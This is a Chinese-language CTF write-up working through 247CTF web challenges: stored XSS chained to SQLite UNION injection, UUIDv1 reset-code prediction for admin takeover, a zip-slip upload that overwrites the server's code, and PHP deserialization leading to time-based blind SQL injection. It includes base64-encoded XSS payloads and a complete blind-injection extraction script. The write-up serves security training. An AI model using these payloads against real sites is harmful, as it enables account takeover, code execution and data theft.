> 原文链接: https://www.anquanke.com//post/id/231177 


# 247CTF的9个web题目分析


                                阅读量   
                                **162898**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01db50b83069ed095e.jpg)](https://p1.ssl.qhimg.com/t01db50b83069ed095e.jpg)



最近朋友推荐几个web题目，都是这个平台的，感觉有些题目还不错，web有十个，有一个要用机器学习识别验证码，就没搞，就写了九个，还是学到了一些骚思路的，还是太菜了

地址[https://247ctf.com/](https://247ctf.com/)

## HELICOPTER ADMINISTRATORS——Hard

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- 从XSS入手，利用SSRF去访问后端的一个有SQLite注入的查询服务
- XSS=&gt;SSRF=&gt;SQLite注入
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

This applications administrators are very aggressive. They will immediately view any page you report. Can you trick them into disclosing data they shouldn’t?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

打开靶机发现有三个用户是可以查看的，不能查看Admin

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010af340854beb11a1.png)

在每个用户页面有两个功能，一个是`Comment`，用来留言，另一个是`Report`，用来向后端的bot提交页面，因为题目描述中说了`They will immediately view any page you report.`，所以这大概率是个XSS。直接提交`&lt;script&gt;alert(1)&lt;/script&gt;`发现是被ban掉的，试了一下发现ban掉了`svg`、`alert`等等

[![](https://p1.ssl.qhimg.com/t014c00d30528995496.png)](https://p1.ssl.qhimg.com/t014c00d30528995496.png)

可以用`&lt;style&gt;`和`atob`函数去bypass，`&lt;style onload=eval(atob("YWxlcnQoMSkK"));&gt;&lt;/style&gt;`

[![](https://p4.ssl.qhimg.com/t01cbd07e703759dfc4.png)](https://p4.ssl.qhimg.com/t01cbd07e703759dfc4.png)

成功XSS，但是还是访问不了Admin。于是尝试一下bot是否可以访问其他用户

payload

```
&lt;style onload=eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsIi9jb21tZW50LzIiLHRydWUpOwp2YXIgcGFyYW1zID0gImNvbW1lbnQ9aGFja2VkIjsKeGhyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKeGhyLnNlbmQocGFyYW1zKTs="));&gt;&lt;/style&gt;
```

```
var xhr = new XMLHttpRequest();
xhr.open("POST","/comment/2",true);
var params = "comment=hacked";
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send(params);
```

在user2发现了两个hacked，一次是提交comment之后自动刷新造成的，一次是bot访问造成的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ea4e165deec9279c.png)

也就是说，可以利用XSS去访问Admin，然后将结果返回到其它用户的comment处

```
&lt;style onload=eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiR0VUIiwgIi91c2VyLzAiLCB0cnVlKTsKeGhyLnNlbmQoKTsKeGhyLm9ubG9hZCA9IGZ1bmN0aW9uKCl7CnZhciByZXNwb25zZWZyb21wYWdlID0geGhyLnJlc3BvbnNlOwp4aHIyLm9wZW4oIlBPU1QiLCIvY29tbWVudC8yIix0cnVlKTsKdmFyIHBhcmFtcyA9ICJjb21tZW50PSIgKyBlbmNvZGVVUkkoYnRvYShyZXNwb25zZWZyb21wYWdlKSk7CnhocjIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp4aHIyLnNlbmQocGFyYW1zKTt9"));&gt;&lt;/style&gt;
```

```
var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();
xhr.open("GET", "/user/0", true);
xhr.send();
xhr.onload = function()`{`
var responsefrompage = xhr.response;
xhr2.open("POST","/comment/2",true);
var params = "comment=" + encodeURI(btoa(responsefrompage));
xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr2.send(params);`}`
```

然后可以在user2处看到返回的经过base64编码的html，解码之后就是原来的页面。

[![](https://p4.ssl.qhimg.com/t0175671056c280f7f5.png)](https://p4.ssl.qhimg.com/t0175671056c280f7f5.png)

不难在返回的html中发现，有个form表单，提交的地址是`/secret_admin_search`，是一个查找的功能，那这里可能会有注入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f5648b8501066eb0.png)

直接访问会提示不是Admin，并且是json格式的数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e6e40ea84e24fef9.png)

就还要利用上面的方式，将结果输出到其它用户的comment处

```
&lt;style onload=eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvc2VjcmV0X2FkbWluX3NlYXJjaCIsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgcGFyYW1ldGVycyA9ICJzZWFyY2g9IiArIGVuY29kZVVSSSgiOyciKTsKeGhyLnNlbmQocGFyYW1ldGVycyk7Cnhoci5vbmxvYWQgPSBmdW5jdGlvbigpewp2YXIgcmVzcG9uc2Vmcm9tcGFnZSA9IHhoci5yZXNwb25zZTsKeGhyMi5vcGVuKCJQT1NUIiwiL2NvbW1lbnQvMyIsdHJ1ZSk7CnZhciBwYXJhbXMgPSAiY29tbWVudD0iICsgZW5jb2RlVVJJKGJ0b2EocmVzcG9uc2Vmcm9tcGFnZSkpOwp4aHIyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKeGhyMi5zZW5kKHBhcmFtcyk7fQ=="));&gt;&lt;/style&gt;
```

```
var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();
xhr.open("POST", "/secret_admin_search", true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var parameters = "search=" + encodeURI(";'");
xhr.send(parameters);
xhr.onload = function()`{`
var responsefrompage = xhr.response;
xhr2.open("POST","/comment/3",true);
var params = "comment=" + encodeURI(btoa(responsefrompage));
xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr2.send(params);`}`
```

返回结果解码之后是SQLite的报第一个错误，把SQL语句改成`1' union select 1,2,3--`报第二个错误，那就说明可能是数字型注入。

用`1 union select 1,2,3--`返回的是列错误，说明是数字型，并且列数不是3，测试了一下，列是6

```
`{`"message":"SQLite error: near \";\": syntax error","result":"error"`}`
`{`"message":"SQLite error: unrecognized token: \"' union select 1,2,3--\"","result":"error"`}`
`{`"message":"SQLite error: SELECTs to the left and right of UNION do not have the same number of result columns","result":"error"`}`
```

```
var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();
xhr.open("POST", "/secret_admin_search", true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var parameters = "search=" + encodeURI("1 union select 1,2,3,4,5,6--");
xhr.send(parameters);
xhr.onload = function()`{`
var responsefrompage = xhr.response;
xhr2.open("POST","/comment/3",true);
var params = "comment=" + encodeURI(btoa(responsefrompage));
xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr2.send(params);`}`
```

```
&lt;style onload=eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvc2VjcmV0X2FkbWluX3NlYXJjaCIsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgcGFyYW1ldGVycyA9ICJzZWFyY2g9IiArIGVuY29kZVVSSSgiMSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYtLSIpOwp4aHIuc2VuZChwYXJhbWV0ZXJzKTsKeGhyLm9ubG9hZCA9IGZ1bmN0aW9uKCl7CnZhciByZXNwb25zZWZyb21wYWdlID0geGhyLnJlc3BvbnNlOwp4aHIyLm9wZW4oIlBPU1QiLCIvY29tbWVudC8zIix0cnVlKTsKdmFyIHBhcmFtcyA9ICJjb21tZW50PSIgKyBlbmNvZGVVUkkoYnRvYShyZXNwb25zZWZyb21wYWdlKSk7CnhocjIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp4aHIyLnNlbmQocGFyYW1zKTt9"));&gt;&lt;/style&gt;
```

得到结果

```
`{`"message":[[1,2,3,4,5,6],[1,"Michael Owens",14,22,3,"Sydney, Australia"]],"result":"success"`}`
```

然后就可以去联合注入了，可以看到flag在flag表中的flag字段

```
0 union select 1,2,3,4,name,sql from sqlite_master where type='table'--

`{`"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,2,3,4,"comment","CREATE TABLE comment (id int, comment text)"],[1,2,3,4,"flag","CREATE TABLE flag (flag text)"],[1,2,3,4,"user","CREATE TABLE user (id int primary key, name text, friends int, likes int, shares int, location text)"]],"result":"success"`}`
```

直接用`-1 union select 1,2,3,4,5,flag from flag--`就可以了

```
var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();
xhr.open("POST", "/secret_admin_search", true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var parameters = "search=" + encodeURI("-1 union select 1,2,3,4,5,flag from flag--");
xhr.send(parameters);
xhr.onload = function()`{`
var responsefrompage = xhr.response;
xhr2.open("POST","/comment/3",true);
var params = "comment=" + encodeURI(btoa(responsefrompage));
xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr2.send(params);`}`
```

```
&lt;style onload=eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvc2VjcmV0X2FkbWluX3NlYXJjaCIsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgcGFyYW1ldGVycyA9ICJzZWFyY2g9IiArIGVuY29kZVVSSSgiLTEgdW5pb24gc2VsZWN0IDEsMiwzLDQsNSxmbGFnIGZyb20gZmxhZy0tIik7Cnhoci5zZW5kKHBhcmFtZXRlcnMpOwp4aHIub25sb2FkID0gZnVuY3Rpb24oKXsKdmFyIHJlc3BvbnNlZnJvbXBhZ2UgPSB4aHIucmVzcG9uc2U7CnhocjIub3BlbigiUE9TVCIsIi9jb21tZW50LzMiLHRydWUpOwp2YXIgcGFyYW1zID0gImNvbW1lbnQ9IiArIGVuY29kZVVSSShidG9hKHJlc3BvbnNlZnJvbXBhZ2UpKTsKeGhyMi5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CnhocjIuc2VuZChwYXJhbXMpO30="));&gt;&lt;/style&gt;
```

结果

```
`{`"message":[[1,2,3,4,5,"247CTF`{`c9355024736f1fdfa121e243c7024540`}`"]],"result":"success"`}`
```



## ADMINISTRATIVE ORM——Hard

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- Flask代码审计
- uuid1()分析
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

We started building a custom ORM for user management. Can you find any bugs before we push to production?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

前面几行是对Flask和ORM的初始化。初始化USER为`admin`

```
import pymysql.cursors
import pymysql, os, bcrypt, debug
from flask import Flask, request
from secret import flag, secret_key, sql_user, sql_password, sql_database, sql_host

class ORM():
    def __init__(self):
        self.connection = pymysql.connect(host=sql_host, user=sql_user, password=sql_password, db=sql_database, cursorclass=pymysql.cursors.DictCursor)
        # ......

app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = secret_key
app.config['USER'] = 'admin'
```

跟着路由走，在第一次访问之前，会初始化一个ORM对象，然后给admin设置一个随机密码，并用hash加盐加密

```
@app.before_first_request
def before_first():
    app.config['ORM'] = ORM()
    app.config['ORM'].set_password(app.config['USER'], os.urandom(32).hex())

class ORM():
    def __init__(self):
        # ......
    def set_password(self, user, password):
        password_hash = bcrypt.hashpw(password, bcrypt.gensalt())
        self.update('update users set password=%s where username=%s', (password_hash, user))
```

然后来到主页，返回题目源码

```
@app.route('/')
def source():
    return "
%s
" % open(__file__).read()
```

访问`/statistics`会返回一些debug数据，这里出现`clock_seq`和`last_reset`的条件是先用错误的`reset_code`去访问`/update_password`，例如`/update_password?reset_code=13814000-1dd2-11b2-8000-0242ac110005&amp;password=123456`

```
@app.route("/statistics") # TODO: remove statistics
def statistics():
    return debug.statistics()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01627cacd6369383fc.png)

访问`/update_password`，要GET传参`reset_code`，要这个`reset_code`存在才可以修改密码，而它是由python的`uuid()`函数生成

```
@app.route("/update_password")
def update_password():
    user_row = app.config['ORM'].get_by_reset_code(request.args.get('reset_code',''))
    if user_row:
        app.config['ORM'].set_password(app.config['USER'], request.args.get('password','').encode('utf8'))
        return "Password reset for %s!" % app.config['USER']
    app.config['ORM'].set_reset_code(app.config['USER'])
    return "Invalid reset code for %s!" % app.config['USER']
class ORM():
    def get_by_reset_code(self, reset_code):
        return self.query('select * from users where reset_code=%s', reset_code)
    def set_reset_code(self, user):
        self.update('update users set reset_code=uuid() where username=%s', user)
```

`/get_flag`是获取flag的逻辑，要输入的`password`和上面随机生成的相同才可以返回flag

```
@app.route("/get_flag")
def get_flag():
    user_row = app.config['ORM'].get_by_name(app.config['USER'])
    if bcrypt.checkpw(request.args.get('password','').encode('utf8'), user_row['password'].encode('utf8')):
        return flag
    return "Invalid password for %s!" % app.config['USER']
class ORM():
    def get_by_name(self, user):
        return self.query('select * from users where username=%s', user)
```

这里用`uuid()`生成`reset_code`，那就去分析代码，看一下生成的条件

python中`uuid.uuid1()`的分析，将其中比较关键的逻辑拿出来看一看

发现需要三个参数，默认参数`node`为`None`是MAC地址的十进制数，`clock_seq`为`None`是一个随机生成的数字，`timestamp`为从 [epoch](https://docs.python.org/zh-cn/3/library/time.html#epoch) 开始的纳秒数，也就是`time.time()`乘以10的9次方。不过要注意的是，题目的时间是`GMT`的，比本地时间(北京时间)的时间戳多了`28800`秒

```
def uuid1(node=None, clock_seq=None):
    # ...
    import time
    nanoseconds = time.time_ns()
    timestamp = nanoseconds // 100 + 0x01b21dd213814000
    # ...
    time_low = timestamp &amp; 0xffffffff
    time_mid = (timestamp &gt;&gt; 32) &amp; 0xffff
    time_hi_version = (timestamp &gt;&gt; 48) &amp; 0x0fff
    clock_seq_low = clock_seq &amp; 0xff
    clock_seq_hi_variant = (clock_seq &gt;&gt; 8) &amp; 0x3f
    # ...
    return UUID(fields=(time_low, time_mid, time_hi_version,
                        clock_seq_hi_variant, clock_seq_low, node), version=1)
```

最终生成`uuid`的代码

```
import time
import uuid
from decimal import *

def mac2int(mac):
    return int(mac.replace(':', ''), 16)

def time2ns(time_str):
    dt,ns = time_str.split(".")
    timeArray = time.strptime(dt, "%Y-%m-%d %H:%M:%S")
    timestamp = time.mktime(timeArray)
    timestamp = int(timestamp)+28800
    timestamp = str(timestamp)+'.'+str(ns)

    return int(Decimal(timestamp)*1000*1000*1000)

def uuid1(node, clock_seq, ts):

    timestamp = ts // 100 + 0x01b21dd213814000
    time_low = timestamp &amp; 0xffffffff
    time_mid = (timestamp &gt;&gt; 32) &amp; 0xffff
    time_hi_version = (timestamp &gt;&gt; 48) &amp; 0x0fff
    clock_seq_low = clock_seq &amp; 0xff
    clock_seq_hi_variant = (clock_seq &gt;&gt; 8) &amp; 0x3f
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                        clock_seq_hi_variant, clock_seq_low, node), version=1)

time_str = '2021-01-29 15:31:05.621730300'
timestamp = time2ns(time_str)

mac = '02:42:AC:11:00:05'
node = mac2int(mac)

clock_seq = 14138

UUID = uuid1(node, clock_seq, timestamp)
print(UUID)
```

这里结果是`008aa0d7-6247-11eb-b73a-0242ac110005`

然后访问`/update_password?reset_code=008aa0d7-6247-11eb-b73a-0242ac110005&amp;password=1234`进行重置密码

最后访问`/get_flag?password=1234`获取flag即可

[![](https://p1.ssl.qhimg.com/t01a8e7a91bc1cf74cf.png)](https://p1.ssl.qhimg.com/t01a8e7a91bc1cf74cf.png)

### <a class="reference-link" name="%E5%85%A8%E9%83%A8%E4%BB%A3%E7%A0%81"></a>全部代码

```
import pymysql.cursors
import pymysql, os, bcrypt, debug
from flask import Flask, request
from secret import flag, secret_key, sql_user, sql_password, sql_database, sql_host

class ORM():
    def __init__(self):
        self.connection = pymysql.connect(host=sql_host, user=sql_user, password=sql_password, db=sql_database, cursorclass=pymysql.cursors.DictCursor)

    def update(self, sql, parameters):
        with self.connection.cursor() as cursor:
          cursor.execute(sql, parameters)
          self.connection.commit()

    def query(self, sql, parameters):
        with self.connection.cursor() as cursor:
          cursor.execute(sql, parameters)
          result = cursor.fetchone()
        return result

    def get_by_name(self, user):
        return self.query('select * from users where username=%s', user)

    def get_by_reset_code(self, reset_code):
        return self.query('select * from users where reset_code=%s', reset_code)

    def set_password(self, user, password):
        password_hash = bcrypt.hashpw(password, bcrypt.gensalt())
        self.update('update users set password=%s where username=%s', (password_hash, user))

    def set_reset_code(self, user):
        self.update('update users set reset_code=uuid() where username=%s', user)

app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = secret_key
app.config['USER'] = 'admin'

@app.route("/get_flag")
def get_flag():
    user_row = app.config['ORM'].get_by_name(app.config['USER'])
    if bcrypt.checkpw(request.args.get('password','').encode('utf8'), user_row['password'].encode('utf8')):
        return flag
    return "Invalid password for %s!" % app.config['USER']

@app.route("/update_password")
def update_password():
    user_row = app.config['ORM'].get_by_reset_code(request.args.get('reset_code',''))
    if user_row:
        app.config['ORM'].set_password(app.config['USER'], request.args.get('password','').encode('utf8'))
        return "Password reset for %s!" % app.config['USER']
    app.config['ORM'].set_reset_code(app.config['USER'])
    return "Invalid reset code for %s!" % app.config['USER']

@app.route("/statistics") # TODO: remove statistics
def statistics():
    return debug.statistics()

@app.route('/')
def source():
    return "

%s

" % open(__file__).read()

@app.before_first_request
def before_first():
    app.config['ORM'] = ORM()
    app.config['ORM'].set_password(app.config['USER'], os.urandom(32).hex())

@app.errorhandler(Exception)
def error(error):
    return "Something went wrong!"

if __name__ == "__main__":
    app.run()
```



## SLIPPERY UPLOAD——Medium

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- [zip路径穿越](https://snyk.io/research/zip-slip-vulnerability)
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

Can you abuse the zip upload and extraction service to gain code execution on the server?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

前面几行进行了Flask的初始化

```
from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'
```

从路由入手

访问主页会得到题目源码

```
@app.route('/')
def source():
    return '

%s

' % open('/app/run.py').read()
```

向`/zip_upload`上传文件会执行`zip_extract`函数进行解压

这里的上传文件可以用Postman去操作

为了绕过第一个`if`，就让上传的`name`属性是`zarchive`，上传的文件名是`zarchive.zip`

为了绕过第二个`if`，就把上传的文件的`content_type`改为`application/octet-stream`

[![](https://p3.ssl.qhimg.com/t0197966de70493a10f.png)](https://p3.ssl.qhimg.com/t0197966de70493a10f.png)

这样就成功上传了文件，在`zip_extract`函数中实现了对上传文件的解压

```
def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())

@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'
```

经过一番搜索，发现这里是存在`Zip Slip Traversal`漏洞，由于没有对zip压缩包里面的filename进行过滤，会导致目录穿越，从而导致文件重写。在本题已经给出了脚本运行目录`/app/run.py`和上传目录`/tmp/uploads/`

```
|--app
| |--run.py
|--tmp
| |--uploads
| | |--zarchive.zip
```

先用Linux下的zip命令生成一个压缩包`zip hack.zip ../../app/run.py`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01bda5a3dad492e83b.png)

这个命令在`ttt`目录下执行，其目录结构如下。这样就会得到一个`hack.zip`

```
|--hack
| |--app
| | |--run.py
| | |--ttt

```

在python shell中看一下`infolist()`，可以发现它的`filename`属性是`../../app/run.py`，而在本题的`zip_extract`函数中，它直接执行了`f.write(z.open(i.filename, 'r').read())`，根据上面的目录结构，这就会造成`run.py`的重写

[![](https://p4.ssl.qhimg.com/t01fe21b3c828e06254.png)](https://p4.ssl.qhimg.com/t01fe21b3c828e06254.png)

```
|--app
| |--run.py
|--tmp
| |--uploads
| | |--zarchive.zip
```

到这本题思路就很清晰了

在本地复制粘贴run.py，加一点代码。`get_flag_path`用来列举目录，`get_flag`用于读取文件

```
@app.route('/flagpath', methods=['GET'])
def get_flag_path():
    dicpath = request.args.get('path') or '/'
    try:
        dir_list = []
        dirs = os.listdir(dicpath)
        for i in dirs:
            dir_list.append(i)
        return ''.join(dir_list)
    except:
        return 'something error'

@app.route('/flag', methods=['GET'])
def get_flag():
    flag_name = request.args.get('flag') or 'run.py'
    try:
        resflag = open(flag_name).read()
        return resflag
    except:
        return 'something error'
```

在Linux中建立如下目录结构，在`ttt`目录下执行`zip zarchive.zip ../../app/run.py`得到`zarchive.zip`

```
|--hack
| |--app
| | |--run.py
| | |--ttt

```

使用Postman上传这个压缩包

[![](https://p2.ssl.qhimg.com/t01b1e10c67494e3d45.png)](https://p2.ssl.qhimg.com/t01b1e10c67494e3d45.png)

访问`/`发现成功覆盖，然后访问`/flagpath?path=/app`得到flag路径，最后访问`/flag?flag=flag_33cd0604f65815a9375e2da04e1b8610.txt`读取flag

[![](https://p3.ssl.qhimg.com/t019f4e08cbd30ec70c.png)](https://p3.ssl.qhimg.com/t019f4e08cbd30ec70c.png)



## CEREAL LOGGER——Medium

### <a class="reference-link" name="%E8%80%83%E7%82%B9"></a>考点
- PHP反序列化=&gt;sqlite3盲注
### <a class="reference-link" name="%E6%8F%8F%E8%BF%B0"></a>描述

Using a specially crafted cookie, you can write data to /dev/null. Can you abuse the write and read the flag?

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

首先是一个写入日志的`insert_log`类，里面实现了SQLite3数据库的`insert`操作。

然后获取cookie中`247`字段对应的内容，以`.`分割，后面的部分要弱等于`0`，前面的部分进行base64解码后再进行反序列化，然后写入到`/dev/null`，`/dev/null`是空设备文件，就是不显示任何信息

```
&lt;?php
  class insert_log
  `{`
      public $new_data = "Valid access logged!";
      public function __destruct()
      `{`
          $this-&gt;pdo = new SQLite3("/tmp/log.db");
          $this-&gt;pdo-&gt;exec("INSERT INTO log (message) VALUES ('".$this-&gt;new_data."');");
      `}`
  `}`
  if (isset($_COOKIE["247"]) &amp;&amp; explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0") `{`
      file_put_contents("/dev/null", unserialize(base64_decode(explode(".", $_COOKIE["247"])[0])));
  `}` else `{`
      echo highlight_file(__FILE__, true);
  `}`
```

这里的SQL语句是完全可控的，也就是说这里是可能存在注入的。

请求时把cookie中`247`字段改为`TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoxMDg6IjAnKTtzZWxlY3QgMSB3aGVyZSAxPShjYXNlIHdoZW4oc3Vic3RyKHNxbGl0ZV92ZXJzaW9uKCksMSwxKT0nMycpIHRoZW4gcmFuZG9tYmxvYigxMDAwMDAwMDAwKSBlbHNlIDAgZW5kKTstLSI7fQ==.0e`，发现返回502

这个payload内容如下

```
O:10:"insert_log":1:`{`s:8:"new_data";s:108:"0');select 1 where 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end);--";`}`
```

相当于进行了sqlite时间盲注，由于这是sqlite3所以版本函数必定返回3开头，所以这里where后面必定是True，改成其他字符，返回200

```
INSERT INTO log (message) VALUES ('
0');select 1 where 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end);--
');
```

由此可以发现，返回502说明正确，返回200说明错误，可以写盲注脚本了

```
import requests
import base64
import time 
proxy = '127.0.0.1:30000'
proxies = `{`
    'http': 'socks5://' + proxy,
    'https': 'socks5://' + proxy
`}`

url = 'https://03644f6a6e290136.247ctf.com/'

def get_cookies(payload):

    serial = 'O:10:"insert_log":1:`{`s:8:"new_data";s:'+str(len(payload))+':"'+payload+'";`}`'
    res = base64.b64encode(serial.encode())
    res = res.decode() + '.0e'
    return res

def exp():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low &lt; high:
            tmp = flag + chr(mid)
            # payload = f"0');select 1 where 1=(case when(substr(sqlite_version(),1,`{`i`}`)&gt;'`{`tmp`}`') then randomblob(1000000000) else 0 end);--"
            # payload = f"0');select 1 where 1=(case when(substr((select name from sqlite_master where type='table' limit 0,1),1,`{`i`}`)&gt;'`{`tmp`}`') then randomblob(1000000000) else 0 end);--"
            # payload = f"0');select 1 where 1=(case when(substr((select name from PRAGMA_TABLE_INFO('flag') limit 0,1),1,`{`i`}`)&gt;'`{`tmp`}`') then randomblob(1000000000) else 0 end);--"

            payload = f"0');select 1 where 1=(case when(substr((select flag from flag limit 0,1),1,`{`i`}`)&gt;'`{`tmp`}`') then randomblob(1000000000) else 0 end);--"
            print(payload)
            cookies = `{`
            '247': get_cookies(payload),
            `}`
            r = requests.get(url=url,cookies=cookies,proxies=proxies)

            code = r.status_code
            if code == 200:
                high = mid
            if code == 502:
                low = mid + 1
            mid = (low+high)//2

            if low == high:
                flag = flag + chr(low)
                break

exp()
```

